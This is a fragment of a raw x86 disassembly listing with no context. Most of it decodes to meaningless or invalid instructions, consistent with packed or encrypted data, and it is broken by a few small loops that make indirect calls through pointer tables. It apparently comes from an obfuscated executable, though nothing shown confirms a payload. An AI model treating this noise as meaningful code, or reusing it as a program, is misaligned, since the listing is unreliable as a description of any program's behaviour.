  401854:	sub    BYTE PTR [edi],ch
  401856:	ins    DWORD PTR es:[edi],dx
  401857:	arpl   WORD PTR [ecx-0x24ec6f3c],ax
  40185d:	jno    0x4018d4
  40185f:	and    al,0xb2
  401861:	cmc    
  401862:	into   
  401863:	aad    0x7a
  401865:	aas    
  401866:	lods   al,BYTE PTR ds:[esi]
  401867:	or     eax,DWORD PTR [eax]
  401869:	in     eax,0x28
  40186b:	mov    ebx,0x86f23a05
  401870:	in     al,dx
  401871:	mov    eax,0xdc84111f
  401876:	xchg   ebp,eax
  401877:	ror    BYTE PTR [eax+0x35dcd27c],1
  40187d:	adc    eax,0xc074e280
  401882:	push   ecx
  401883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401884:	jp     0x401886
  401886:	ss iret 
  401888:	aas    
  401889:	and    al,0xfd
  40188b:	out    0xe6,al
  40188d:	xchg   ecx,eax
  40188e:	test   al,0x99
  401890:	mov    bl,bl
  401892:	push   es
  401893:	fisttp WORD PTR [ecx+0x1f2b22]
  401899:	cmp    ah,BYTE PTR [edx+0xa]
  40189c:	adc    eax,0x1b07ecb6
  4018a1:	rcr    edx,1
  4018a3:	imul   ebx,DWORD PTR [ebp-0x25],0x2b
  4018a7:	dec    eax
  4018a8:	outs   dx,BYTE PTR ds:[esi]
  4018a9:	int    0x50
  4018ab:	cdq    
  4018ac:	jae    0x4018d9
  4018ae:	out    dx,eax
  4018af:	xchg   BYTE PTR [edx+edi*1+0x3b0d3967],dl
  4018b6:	jns    0x401927
  4018b8:	ror    dh,cl
  4018ba:	mov    ds:0x9f6c8746,eax
  4018bf:	clc    
  4018c0:	test   esp,edx
  4018c2:	stos   DWORD PTR es:[edi],eax
  4018c3:	aad    0xa2
  4018c5:	test   al,0x75
  4018c7:	or     DWORD PTR [ebx+0x36659b4e],ebp
  4018cd:	xchg   ebp,eax
  4018ce:	popa   
  4018cf:	popa   
  4018d0:	add    bh,BYTE PTR [edx+0x1317c9ad]
  4018d6:	xor    eax,0x58cde319
  4018db:	mov    bh,0x68
  4018dd:	xchg   ebp,eax
  4018de:	or     al,0xf0
  4018e0:	pop    ebp
  4018e1:	mov    al,0x9
  4018e3:	ror    DWORD PTR [edx-0x24063999],0xd0
  4018ea:	jle    0x401910
  4018ec:	mov    ds:0xddfd819c,eax
  4018f1:	fsubr  st,st(2)
  4018f3:	popf   
  4018f4:	xor    ah,bh
  4018f6:	cmp    ah,BYTE PTR [ecx+esi*2+0x1192e1c0]
  4018fd:	push   esp
  4018fe:	fprem1 
  401900:	mov    ch,0x49
  401902:	ins    BYTE PTR es:[edi],dx
  401903:	inc    ebp
  401904:	icebp  
  401905:	repz imul eax,DWORD PTR [edi+0x2],0xb51f53bb
  40190d:	lds    ebx,FWORD PTR [esi]
  40190f:	stos   BYTE PTR es:[edi],al
  401910:	and    al,0xb9
  401912:	fisttp DWORD PTR ds:[ebp+0x37e0197a]
  401919:	cmp    eax,0x600ed2bf
  40191e:	dec    esp
  40191f:	in     eax,dx
  401920:	mov    ebp,0xc42d2ad4
  401925:	ins    BYTE PTR es:[edi],dx
  401926:	pop    ebx
  401927:	and    ecx,ecx
  401929:	lahf   
  40192a:	popa   
  40192b:	push   edi
  40192c:	pop    edx
  40192d:	repnz xor edi,ebp
  401930:	mov    bl,0x16
  401932:	mov    cl,0xa1
  401934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401935:	(bad)  
  401937:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401938:	inc    ebx
  401939:	mov    dl,0xb1
  40193b:	sar    BYTE PTR [edi+0x7f0e746b],0xc0
  401942:	out    0x9b,al
  401944:	out    dx,eax
  401945:	cmp    DWORD PTR [ebx-0x77],ecx
  401948:	js     0x401935
  40194a:	aam    0xae
  40194c:	mov    bh,0x6d
  40194e:	pop    ds
  40194f:	or     ax,0x1eee
  401953:	js     0x401953
  401955:	mov    edx,0x63d3595f
  40195a:	jle    0x4018f0
  40195c:	adc    bh,bl
  40195e:	push   eax
  40195f:	mov    eax,ds:0x82839195
  401964:	stos   BYTE PTR es:[edi],al
  401965:	mov    BYTE PTR [esi],bl
  401967:	ret    0x4154
  40196a:	out    0x91,al
  40196c:	jl     0x401929
  40196e:	(bad)  
  40196f:	sti    
  401970:	sub    bl,BYTE PTR [edi+0x1]
  401973:	ds dec esp
  401975:	dec    edi
  401976:	js     0x401964
  401978:	add    ecx,DWORD PTR [ebp+0x147bb192]
  40197e:	dec    esp
  40197f:	pop    eax
  401980:	jl     0x401950
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	lahf   
  4019a4:	test   eax,0x182eff8
  4019a9:	js     0x401a23
  4019ab:	(bad)  
  4019ac:	jle    0x401a26
  4019ae:	js     0x401a01
  4019b0:	cld    
  4019b1:	ds or  al,0x39
  4019b4:	mov    bl,0x7e
  4019b6:	and    esi,eax
  4019b8:	mov    edi,DWORD PTR [ebp+0x4ed1f7fe]
  4019be:	mov    WORD PTR [edi],es
  4019c0:	mov    al,ds:0xe5e670f0
  4019c5:	xchg   ecx,eax
  4019c6:	adc    al,0x24
  4019c8:	retf   0x49c3
  4019cb:	aas    
  4019cc:	sub    BYTE PTR [edi],0xa8
  4019cf:	cmp    bh,BYTE PTR [ecx+0x54]
  4019d2:	scas   al,BYTE PTR es:[edi]
  4019d3:	repnz pushf 
  4019d5:	aam    0xa3
  4019d7:	sbb    DWORD PTR [edx-0x7164f149],edi
  4019dd:	bound  edx,QWORD PTR [ebp-0xeed458a]
  4019e3:	pop    ebx
  4019e4:	pushf  
  4019e5:	and    ebx,eax
  4019e7:	test   al,0xc4
  4019e9:	data16 fild DWORD PTR [edi+0x41]
  4019ed:	push   ds
  4019ee:	stos   DWORD PTR es:[edi],eax
  4019ef:	mov    DWORD PTR [edi+0x766e1ffe],eax
  4019f5:	aaa    
  4019f6:	jl     0x4019fe
  4019f8:	in     eax,dx
  4019f9:	inc    esp
  4019fa:	mov    eax,ds:0xe7ceba0c
  4019ff:	fsubr  QWORD PTR [ecx-0x7c883dfa]
  401a05:	jmp    0xdf44:0x34f0bb77
  401a0c:	addr16 loope 0x401996
  401a0f:	lods   al,BYTE PTR ds:[esi]
  401a10:	jns    0x401a43
  401a12:	xchg   ecx,eax
  401a13:	push   cs
  401a14:	(bad)  
  401a15:	in     al,0x58
  401a17:	or     al,0x52
  401a19:	xchg   ebx,eax
  401a1a:	mov    eax,ds:0xac150b65
  401a1f:	jg     0x401a55
  401a21:	xchg   ebp,eax
  401a22:	iret   
  401a23:	cdq    
  401a24:	(bad)  
  401a25:	aaa    
  401a26:	je     0x4019f0
  401a28:	adc    eax,0x49eb3722
  401a2d:	jmp    0xe3aa:0xa0f07935
  401a34:	jmp    0x4019fa
  401a36:	mov    cl,0xcb
  401a38:	call   0x4dc86230
  401a3d:	fs sub ecx,esp
  401a40:	adc    BYTE PTR [esi],al
  401a42:	mov    eax,0xc69c7d1
  401a47:	pop    esp
  401a48:	call   0x4685ee48
  401a4d:	and    eax,0x2d2b9e75
  401a52:	inc    esi
  401a53:	jbe    0x401a78
  401a55:	jmp    0xe032:0xc44e2afe
  401a5c:	repnz fcomp QWORD PTR fs:[eax+0x7]
  401a62:	int    0x7d
  401a64:	mov    al,0xfe
  401a66:	retf   
  401a67:	imul   edx,ebx,0xb4761dca
  401a6d:	cld    
  401a6e:	lds    edx,FWORD PTR [edx+0x27fbbb0e]
  401a74:	mov    ebx,edi
  401a76:	sahf   
  401a77:	fsubrp st(2),st
  401a79:	repnz push esi
  401a7b:	jle    0x401a7e
  401a7d:	mov    es,WORD PTR [ecx+0x77ba3384]
  401a83:	js     0x401a80
  401a85:	inc    ebp
  401a86:	in     al,0xf0
  401a88:	push   ecx
  401a89:	ds sbb al,0x46
  401a8c:	sub    bh,dl
  401a8e:	push   edi
  401a8f:	ds dec edx
  401a91:	push   eax
  401a92:	jbe    0x401ae6
  401a94:	ss mov ecx,0x3f42fd8a
  401a9a:	jae    0x401a52
  401a9c:	shl    DWORD PTR [esi+ecx*4+0x75e8885f],1
  401aa3:	pop    edx
  401aa4:	pop    esp
  401aa5:	(bad)  
  401aa6:	icebp  
  401aa7:	jmp    0x401a75
  401aa9:	aad    0xd2
  401aab:	loop   0x401b19
  401aad:	push   es
  401aae:	into   
  401aaf:	fsubr  QWORD PTR [edi]
  401ab1:	ins    DWORD PTR es:[edi],dx
  401ab2:	mov    eax,0x8be02449
  401ab7:	mov    edi,0xa8d43f6b
  401abc:	mov    al,ds:0x63c1c20
  401ac1:	(bad)  
  401ac3:	push   ebx
  401ac4:	add    al,0xd
  401ac6:	pop    ebp
  401ac7:	jns    0x401ae6
  401ac9:	push   0x2e072010
  401ace:	push   ss
  401acf:	pop    edx
  401ad0:	(bad)  
  401ad1:	leave  
  401ad2:	inc    edx
  401ad3:	rcl    DWORD PTR [esi-0x7345c8e4],1
  401ad9:	int3   
  401ada:	std    
  401adb:	sub    BYTE PTR [edi],0xf9
  401ade:	cmp    cl,0xa3
  401ae1:	push   0x81641f66
  401ae6:	imul   eax,DWORD PTR [ecx-0x30],0x5a
  401aea:	fs pusha 
  401aec:	sub    ah,BYTE PTR [eax+ebx*8+0x665d0ee7]
  401af3:	outs   dx,BYTE PTR ds:[esi]
  401af4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401af5:	ss jo  0x401acc
  401af8:	cmp    al,0xea
  401afa:	pop    ecx
  401afb:	gs inc ebp
  401afd:	push   edi
  401afe:	add    al,0xa9
  401b00:	out    dx,eax
  401b01:	dec    ecx
  401b02:	ja     0x401b2f
  401b04:	push   ebp
  401b05:	out    dx,al
  401b06:	add    eax,0x20c2acfb
  401b0b:	call   FWORD PTR [edx+0x77e5abf5]
  401b11:	sub    DWORD PTR [esi+0xcbddfa],ebx
  401b17:	aas    
  401b18:	jnp    0x401b6e
  401b1a:	jg     0x401b75
  401b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b1d:	mov    edx,0x3aa7142f
  401b22:	test   bl,dl
  401b24:	int3   
  401b25:	pop    ebp
  401b26:	dec    edx
  401b27:	aas    
  401b28:	jge    0x401acb
  401b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b2b:	or     edx,esp
  401b2d:	sub    al,0x3f
  401b2f:	int    0x3f
  401b31:	mov    esi,0xb2bcf801
  401b36:	(bad)  
  401b37:	adc    eax,0x8bd2378b
  401b3c:	(bad)  
  401b3d:	cmp    DWORD PTR [ebx+0x20],edi
  401b40:	in     al,0xc4
  401b42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b43:	(bad)  
  401b44:	leave  
  401b45:	mov    ds:0x6da884b0,eax
  401b4a:	ja     0x401b54
  401b4c:	xchg   esp,eax
  401b4d:	xchg   esi,eax
  401b4e:	js     0x401b63
  401b50:	adc    BYTE PTR [ecx-0x6db27727],al
  401b56:	ins    DWORD PTR es:[edi],dx
  401b57:	arpl   WORD PTR [eax],bx
  401b59:	pop    esi
  401b5a:	xor    eax,0x6e224637
  401b5f:	xor    ch,0xe2
  401b62:	jno    0x401b48
  401b64:	mov    eax,0x1b3c20b7
  401b69:	dec    esp
  401b6a:	mov    DWORD PTR [eax-0x33],esi
  401b6d:	jbe    0x401b12
  401b6f:	int3   
  401b70:	pusha  
  401b71:	es sbb ah,0xad
  401b75:	jne    0x401bd6
  401b77:	loopne 0x401b2b
  401b79:	mov    dh,cl
  401b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b7c:	enter  0xc6c2,0x15
  401b80:	push   esp
  401b81:	rol    cl,cl
  401b83:	xor    BYTE PTR [edi],cl
  401b85:	imul   eax,DWORD PTR [edi],0xdb7c8ef2
  401b8b:	push   0xffffffd9
  401b8d:	into   
  401b8e:	shl    dh,0x75
  401b91:	js     0x401b13
  401b93:	neg    BYTE PTR [esi+0xca4c12b]
  401b99:	call   0xc34661d8
  401b9e:	cmc    
  401b9f:	sub    eax,0xadc4d45
  401ba4:	add    cl,BYTE PTR [ecx+esi*8+0x48181cc3]
  401bab:	and    DWORD PTR [esi+0x47],esp
  401bae:	pushf  
  401baf:	push   0xfffffff8
  401bb1:	aaa    
  401bb2:	mov    bl,al
  401bb4:	xchg   ebp,eax
  401bb5:	mov    ebp,0xa87f4f95
  401bba:	mov    bl,0x9e
  401bbc:	push   ds
  401bbd:	pushf  
  401bbe:	adc    DWORD PTR [edi+0x39],edx
  401bc1:	jmp    0x401b74
  401bc3:	sub    eax,0x48868e4b
  401bc8:	inc    ebp
  401bc9:	mov    bh,0x27
  401bcb:	imul   edi,DWORD PTR [ebx-0x15803f4],0x7fa8e078
  401bd5:	xchg   edi,eax
  401bd6:	dec    ebx
  401bd7:	cmp    BYTE PTR [eax+0x2a],ch
  401bda:	mov    al,0x3c
  401bdc:	push   esp
  401bdd:	mov    edi,0x87ab2ea7
  401be2:	jbe    0x401c0b
  401be4:	push   ebp
  401be5:	std    
  401be6:	repnz mov ecx,0xbeeb425e
  401bec:	mov    esi,0xb3022086
  401bf1:	mov    DWORD PTR [edi],edx
  401bf3:	inc    eax
  401bf4:	mov    BYTE PTR [ebx-0x7f],al
  401bf7:	pop    esp
  401bf8:	xor    esp,DWORD PTR [edi-0x2075abe8]
  401bfe:	and    edi,DWORD PTR [edx-0x9]
  401c01:	lock mov al,0x75
  401c04:	push   eax
  401c05:	mov    edi,0x82a6eade
  401c0a:	ins    DWORD PTR es:[edi],dx
  401c0b:	cmc    
  401c0c:	nop
  401c0d:	push   ebx
  401c0e:	shr    ah,1
  401c10:	mov    ebx,0xb94b6dcb
  401c15:	cmp    BYTE PTR [edi-0x17],dh
  401c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c19:	inc    ebp
  401c1a:	sti    
  401c1b:	ror    DWORD PTR [ebp+0x602179b6],1
  401c21:	in     eax,dx
  401c22:	popf   
  401c23:	push   ss
  401c24:	aas    
  401c25:	or     BYTE PTR [esi+0x54937afe],cl
  401c2b:	sti    
  401c2c:	ss leave 
  401c2e:	daa    
  401c2f:	push   esp
  401c30:	test   DWORD PTR [ecx+0x2581e045],0x42a85d
  401c3a:	add    BYTE PTR [eax],al
  401c3c:	add    BYTE PTR [eax],al
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a85d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a85d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a85d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a85d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa4e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a85d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a85d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a85d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a781,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a795
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a789
  401cbe:	and    eax,DWORD PTR ds:0x42a7d9
  401cc4:	mov    ds:0x42a789,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a819,0x42a821
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a79d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0x7cba
  401d05:	shl    DWORD PTR [eax+0x78060019],0x78
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401cf1
  401d11:	push   ebx
  401d12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d13:	or     ecx,edx
  401d15:	jl     0x401cc7
  401d17:	neg    BYTE PTR [eax-0x13]
  401d1a:	mov    ah,0x1e
  401d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d1d:	sub    ah,al
  401d1f:	int3   
  401d20:	hlt    
  401d21:	pop    eax
  401d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d24:	arpl   dx,dx
  401d26:	retf   0x1f34
  401d29:	push   esi
  401d2a:	mov    bl,0x3c
  401d2c:	out    0xac,eax
  401d2e:	mov    cl,0x14
  401d30:	fldcw  WORD PTR [eax+0x275d864b]
  401d36:	xor    al,0x35
  401d38:	sub    cl,BYTE PTR [esi-0x4de5e7a0]
  401d3e:	ins    DWORD PTR es:[edi],dx
  401d3f:	imul   ebp,DWORD PTR [eax-0x2fb2bc50],0xf1cda96
  401d49:	sbb    ebx,DWORD PTR [esp+ebx*8]
  401d4c:	cmp    ebx,DWORD PTR [edx]
  401d4e:	sub    al,0xaa
  401d50:	in     al,dx
  401d51:	jne    0x401d07
  401d53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d54:	fild   DWORD PTR [ebx-0x287cedf8]
  401d5a:	xor    BYTE PTR [ebp-0x40],dh
  401d5d:	fisttp QWORD PTR ds:0x62f90a4c
  401d63:	dec    eax
  401d64:	jnp    0x401d4e
  401d66:	test   BYTE PTR [ebx],dl
  401d68:	cmp    eax,0xe9b2d370
  401d6d:	scas   eax,DWORD PTR es:[edi]
  401d6e:	mov    esi,0x647a30f0
  401d73:	nop
  401d74:	je     0x401dc1
  401d76:	inc    ebx
  401d77:	les    ebp,FWORD PTR [ebp+0x6e6a2259]
  401d7d:	repz cs jo 0x401d55
  401d81:	ss loope 0x401d35
  401d84:	sti    
  401d85:	ds xor ebp,0xa
  401d89:	cmp    bh,BYTE PTR [edi]
  401d8b:	nop
  401d8c:	xlat   BYTE PTR ds:[ebx]
  401d8d:	xchg   edx,eax
  401d8e:	out    0x49,al
  401d90:	(bad)  
  401d91:	pop    ds
  401d92:	pop    edx
  401d93:	stos   BYTE PTR es:[edi],al
  401d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d95:	sbb    ah,BYTE PTR [edx+esi*2-0x1c]
  401d99:	add    al,0x1a
  401d9b:	mov    es,ebp
  401d9d:	scas   al,BYTE PTR es:[edi]
  401d9e:	neg    BYTE PTR [eax+esi*4+0x27]
  401da2:	inc    esp
  401da3:	data16 das 
  401da5:	push   cs
  401da6:	dec    esp
  401da7:	xchg   ebp,eax
  401da8:	retf   
  401da9:	scas   al,BYTE PTR es:[edi]
  401daa:	jmp    0x401d61
  401dac:	mov    ebp,0x777296e3
  401db1:	or     eax,0xe77e1eb
  401db6:	(bad)  
  401db7:	rcl    edx,1
  401db9:	stos   DWORD PTR es:[edi],eax
  401dba:	xchg   BYTE PTR [ebx],dh
  401dbc:	jb     0x401da7
  401dbe:	imul   esi,ebx,0xffffff83
  401dc1:	xchg   DWORD PTR [bp-0x3b],eax
  401dc5:	outs   dx,DWORD PTR ds:[esi]
  401dc6:	pushf  
  401dc7:	imul   eax,ecx,0xffffff86
  401dca:	mov    eax,0x78ebe404
  401dcf:	retf   0xc6bb
  401dd2:	sbb    ah,dl
  401dd4:	out    0x47,al
  401dd6:	ins    BYTE PTR es:[edi],dx
  401dd7:	push   cs
  401dd8:	sub    BYTE PTR ds:0xca0cc557,dh
  401dde:	mov    ecx,0x9680f17f
  401de3:	repz mov edx,0xe65917d6
  401de9:	popa   
  401dea:	mov    ah,al
  401dec:	sub    BYTE PTR [eax+0x4d],bl
  401def:	mov    al,0xa8
  401df1:	push   edi
  401df2:	add    DWORD PTR [ecx-0x55],ebx
  401df5:	mov    al,ds:0x9e0152cc
  401dfa:	sbb    eax,DWORD PTR [ebp+0x6768e2f6]
  401e00:	das    
  401e01:	pop    edi
  401e02:	out    0xc4,al
  401e04:	mov    ebp,0xa4fda9d2
  401e09:	popf   
  401e0a:	enter  0x41b,0xb8
  401e0e:	stc    
  401e0f:	push   ss
  401e10:	mov    bh,BYTE PTR [edx-0x2d]
  401e13:	repnz fmul QWORD PTR es:[ecx-0x29]
  401e18:	test   al,0x15
  401e1a:	in     eax,dx
  401e1b:	in     al,dx
  401e1c:	je     0x401e02
  401e1e:	sbb    DWORD PTR [ecx],ecx
  401e20:	std    
  401e21:	cmp    dh,bh
  401e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e24:	mov    cs:0xff32f289,al
  401e2a:	les    ebp,FWORD PTR [ecx-0x74bde2d1]
  401e30:	jno    0x401e68
  401e32:	pop    ecx
  401e33:	cmp    DWORD PTR [ebx-0x7ede0b44],esp
  401e39:	test   BYTE PTR [edx+0x19],bh
  401e3c:	imul   esi,esi,0x9debe9f9
  401e42:	mov    eax,0xa119b8a8
  401e47:	add    al,0xd6
  401e49:	push   esp
  401e4a:	aad    0xd3
  401e4c:	jbe    0x401dd1
  401e4e:	or     DWORD PTR [ebx-0x48],0xffffff8b
  401e52:	cli    
  401e53:	fisubr WORD PTR [edx-0x63]
  401e56:	mov    eax,0xe187e4c0
  401e5b:	test   al,0x77
  401e5d:	push   esp
  401e5e:	mov    eax,0xd41af54d
  401e63:	sub    eax,0x8330c34
  401e68:	sub    DWORD PTR [esi-0x3ab94934],edi
  401e6e:	inc    eax
  401e6f:	ret    
  401e70:	pop    ebx
  401e71:	xchg   BYTE PTR [ecx-0x6a5bf8bd],cl
  401e77:	repnz out dx,eax
  401e79:	fcom   DWORD PTR [ecx+0x21d8e1df]
  401e7f:	push   ebp
  401e80:	test   BYTE PTR [esi],cl
  401e82:	retf   
  401e83:	aam    0x46
  401e85:	xor    al,BYTE PTR [edx+0x19e2d0e2]
  401e8b:	inc    ebp
  401e8c:	inc    esi
  401e8d:	out    dx,al
  401e8e:	cmp    DWORD PTR [ecx+0x5518f2ec],ebx
  401e94:	or     BYTE PTR [edx-0x4e],dl
  401e97:	or     DWORD PTR [esi],eax
  401e99:	sub    eax,0xad07ee0c
  401e9e:	iret   
  401e9f:	out    dx,al
  401ea0:	push   0xdf8742ba
  401ea5:	push   eax
  401ea6:	repz imul esp,DWORD PTR [edx+ecx*2],0xffffff90
  401eab:	jne    0x401e91
  401ead:	je     0x401e8b
  401eaf:	vpsubsw ymm3,ymm7,YMMWORD PTR [eax-0x39aaba7f]
  401eb7:	mov    cl,0x19
  401eb9:	jge    0x401e46
  401ebb:	(bad)
  401ebf:	xor    al,0x8
  401ec1:	ret    0xab93
  401ec4:	leave  
  401ec5:	mov    ah,0xe5
  401ec7:	aas    
  401ec8:	into   
  401ec9:	jae    0x401ed5
  401ecb:	mov    ss,ecx
  401ecd:	dec    edx
  401ece:	aad    0x27
  401ed0:	sub    al,BYTE PTR [edi-0x18a9b7ef]
  401ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ed7:	in     eax,0xce
  401ed9:	inc    edx
  401eda:	pop    eax
  401edb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401edc:	pop    ecx
  401edd:	fwait
  401ede:	jo     0x401e7c
  401ee0:	xchg   edx,eax
  401ee1:	lods   eax,DWORD PTR ds:[esi]
  401ee2:	jae    0x401f3e
  401ee4:	inc    edx
  401ee5:	mov    eax,0x8e20dd69
  401eea:	mov    DWORD PTR [edx-0x24255259],edi
  401ef0:	cwde   
  401ef1:	fdiv   QWORD PTR [esi]
  401ef3:	fwait
  401ef4:	aaa    
  401ef5:	mov    WORD PTR [ebp+0x6f3680a9],?
  401efb:	les    ecx,FWORD PTR [eax-0x7e]
  401efe:	adc    al,0x61
  401f00:	imul   eax,DWORD PTR [esi+0x553eda93],0xffffffd5
  401f07:	adc    cl,BYTE PTR [ecx+0x5d]
  401f0a:	test   DWORD PTR [edx-0x6853d7d0],edx
  401f10:	mov    gs,WORD PTR [ebp+0x5ad61e4]
  401f16:	pop    ebx
  401f17:	mov    edi,0x9cb28e78
  401f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1d:	sti    
  401f1e:	pop    es
  401f1f:	loope  0x401f23
  401f21:	pop    eax
  401f22:	fmul   DWORD PTR [eax]
  401f24:	loop   0x401ef6
  401f26:	shr    ah,cl
  401f28:	jmp    0xa852:0xaa75b3cc
  401f2f:	call   0x8b3661b5
  401f34:	cmp    bl,ah
  401f36:	inc    ebp
  401f37:	dec    esp
  401f38:	repnz pop ecx
  401f3a:	gs es push 0x27
  401f3e:	add    eax,0x311f924d
  401f43:	xlat   BYTE PTR ds:[ebx]
  401f44:	std    
  401f45:	out    dx,al
  401f46:	xchg   esi,eax
  401f47:	push   edi
  401f48:	or     DWORD PTR ds:0xbb592a8e,0x12e14f71
  401f52:	mov    ds:0xf7a93bb4,eax
  401f57:	mov    ds:0xb7222a7b,al
  401f5c:	aam    0x35
  401f5e:	sub    al,0xbd
  401f60:	jns    0x401f40
  401f62:	mov    al,dl
  401f64:	xor    cl,bh
  401f66:	mov    ah,0x6c
  401f68:	mov    al,ds:0x52f8dd33
  401f6d:	jns    0x401fda
  401f6f:	mov    esi,0x27585ebd
  401f74:	adc    esi,esp
  401f76:	retf   
  401f77:	dec    edi
  401f78:	(bad)  
  401f79:	stos   BYTE PTR es:[edi],al
  401f7a:	fwait
  401f7b:	addr16 pop ebp
  401f7d:	or     eax,0x12e6833f
  401f82:	sti    
  401f83:	test   BYTE PTR [edx*2-0x421b059c],cl
  401f8a:	retf   0xf4e6
  401f8d:	test   DWORD PTR [edx+0x3ee924f],ebx
  401f93:	or     BYTE PTR [ebx],dh
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	pop    ecx
  401f99:	test   al,0x42
  401f9b:	add    BYTE PTR [ebx],ah
  401f9d:	add    eax,0x42a8a9
  401fa2:	mov    ds:0x42a859,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a811,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a779,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a779
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a779,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a779,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a779,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edi+0x44],eax
  402019:	or     ch,dl
  40201b:	xchg   BYTE PTR [eax+edi*2],al
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x40205a
  402024:	adc    eax,0x221c608a
  402029:	lea    edi,[eax-0x6bc3f12c]
  40202f:	push   ss
  402030:	shl    BYTE PTR [eax+0x17bb3c27],1
  402036:	xor    BYTE PTR [eax-0x1acadf7],bl
  40203c:	xchg   ecx,eax
  40203d:	popf   
  40203e:	jno    0x401fd0
  402040:	mov    esp,DWORD PTR [edx+ebp*2]
  402043:	and    edx,DWORD PTR [eax-0x57]
  402046:	or     ebp,DWORD PTR [esp+esi*4+0x1c]
  40204a:	add    eax,0xcc24710d
  40204f:	scas   eax,DWORD PTR es:[edi]
  402050:	adc    al,0x8a
  402052:	add    dh,BYTE PTR [ebx-0x15a85b4]
  402058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402059:	lock xchg esi,eax
  40205b:	fistp  QWORD PTR [edi]
  40205d:	xchg   ecx,eax
  40205e:	jl     0x402048
  402060:	cld    
  402061:	popf   
  402062:	adc    BYTE PTR [ecx],0x82
  402065:	sub    al,0x93
  402067:	ret    
  402068:	cmp    edx,esi
  40206a:	ss (bad) 
  40206c:	in     eax,dx
  40206d:	xchg   ebx,eax
  40206e:	or     dl,bh
  402070:	jmp    DWORD PTR ds:0x18a2bdbc
  402076:	call   esp
  402078:	in     al,0xd9
  40207a:	std    
  40207b:	test   DWORD PTR [esi+0x2eaba846],ecx
  402081:	and    DWORD PTR [edx+ebp*2+0x66],0xbf7f3da7
  402089:	add    BYTE PTR [eax-0x60],ch
  40208c:	stos   BYTE PTR es:[edi],al
  40208d:	loop   0x402079
  40208f:	push   esp
  402090:	jmp    0x4020ef
  402092:	jno    0x402017
  402094:	xlat   BYTE PTR ss:[ebx]
  402096:	cwde   
  402097:	jbe    0x40209e
